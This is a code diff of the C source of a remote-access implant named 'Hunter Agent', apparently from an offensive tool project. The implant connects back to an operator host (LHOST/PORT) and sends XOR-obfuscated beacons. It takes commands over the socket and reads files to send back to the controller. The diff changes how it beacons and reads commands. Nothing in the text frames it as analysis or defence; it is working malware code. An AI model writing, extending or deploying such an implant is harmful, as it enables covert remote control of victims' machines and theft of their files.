@@ -16,14 +16,22 @@
 char* key = KEY;
 int connection_established;
 int sock;
+char buf[MAXBUF];
+int bufsize;
+int sleeptime = 5;
 
-void* Callback(){
-	char* callback = "--HEADHUNTER BEACON--";
-	char* xorcallback = XOR(callback, key, strlen(callback), strlen(key));
+void* Read(){
+
+	// Initial beacon connection
+	
+	char* beacon = "--HEADHUNTER BEACON--";
+	char* xorbeacon = XOR(beacon, key, strlen(beacon), strlen(key));
+	send(sock, xorbeacon, strlen(beacon), 0);
 
 	while(connection_established == 0){
-		send(sock, xorcallback, strlen(callback), 0);
-		sleep(300);
+		while(bufsize = read(sock, buf, MAXBUF)){
+			;;
+		}
 	}
 	
 }
@@ -49,37 +57,36 @@ int sendfile(FILE* fp, int fd, char* key)
 
 int main(void)
 {
-
-
 	signal(SIGCHLD, SIG_IGN);
 
 	char* ip = LHOST;
-	int keylen = strlen(key);
 	int port = PORT;
 	int n = 0;
-	char buf[MAXBUF];
-	pthread_t callback;
+	pthread_t read_thread;
 	struct sockaddr_in sa;
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
 	sa.sin_addr.s_addr = inet_addr(ip);
+
+	int keylen = strlen(key);
 
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 	do {
 		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
 	} while(connection_established != 0);
 
-	pthread_create(&callback, NULL, Callback, NULL);
-	
-	sleep(1);
-	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
-	write(sock, xorhello, 18);
+	pthread_create(&read_thread, NULL, Read, NULL);
+
+	char* beacon = "--HEADHUNTER BEACON--";
+	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);
 
 	while (connection_established == 0)
 	{
-		while((n = read(sock, buf, MAXBUF)) > 0)
-		{
-			char* xorbuf = XOR(buf, key, n, keylen);
+		sleep(sleeptime);
+		if(strlen(buf) > 0){
+			
+			send(sock, xorbeacon, strlen(beacon), 0);
+			char* xorbuf = XOR(buf, key, bufsize, keylen);
 			// TODO: Revamp argument parsing (there's a better way! :)
 			if(strncmp(xorbuf, "help\n", 5) == 0)
 			{
@@ -93,8 +100,6 @@ int main(void)
 				int status;
 				pid_t child_pid;
 				FILE* fp;
-				
-
 				
 				char* cmd = split(xorbuf, " ");			
 	
@@ -132,7 +137,7 @@ int main(void)
 				fp = fopen(cmd, "r");
 				if(fp == NULL){
 					
-					char* openerr = "[-] Error opening file\n";
+					char* openerr = "\e[1;31m[-]\e[0m Error opening file\n";
 					char* xoropenerr = XOR(openerr, key, strlen(openerr), keylen);
 					write(sock, xoropenerr, strlen(openerr));
 					free(xoropenerr);
@@ -169,7 +174,7 @@ int main(void)
 				char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
 				write(sock, xordisconnect, strlen(disconnect));
 				free(xordisconnect);
-				pthread_cancel(callback);
+				pthread_cancel(read_thread);
 				return 0;
 			}
 			else
@@ -180,6 +185,9 @@ int main(void)
 			
 			memset(buf, '\0', strlen(buf));
 			free(xorbuf);
+		}
+		else {
+			send(sock, xorbeacon, strlen(beacon), 0);
 		}
 	}
 
